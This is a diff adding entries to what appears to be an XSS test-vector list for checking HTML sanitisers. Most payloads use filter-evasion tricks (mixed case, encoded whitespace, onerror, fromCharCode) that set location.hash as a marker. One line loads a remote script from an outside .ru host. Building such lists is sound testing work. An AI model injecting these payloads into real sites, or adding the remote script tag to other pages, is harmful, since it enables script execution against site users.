@@ -1,1 +1,13 @@
+<SCRIPT SRC=http://obuv-umka.ru/js/xss.js></SCRIPT>
 <IMG SRC="javascript:location.hash=10;">
+<IMG SRC=javascript:location.hash=10>
+<IMG SRC=JaVaScRiPt:location.hash=10>
+<IMG SRC=`javascript:location.hash="10"`>
+<IMG SRC=`javascript:location.hash=10`>
+<IMG """><SCRIPT>location.hash=10</SCRIPT>">
+<IMG SRC=javascript:location.hash=String.fromCharCode(49, 48))>
+<IMG SRC=/ onerror="location.hash=String.fromCharCode(49, 48)"></img>
+<IMG SRC="jav	ascript:location.hash=10;">
+<IMG SRC="jav&#x09;ascript:location.hash=10;">
+<IMG SRC="jav&#x0A;ascript:location.hash=10;">
+<IMG SRC="jav&#x0D;ascript:location.hash=10;">
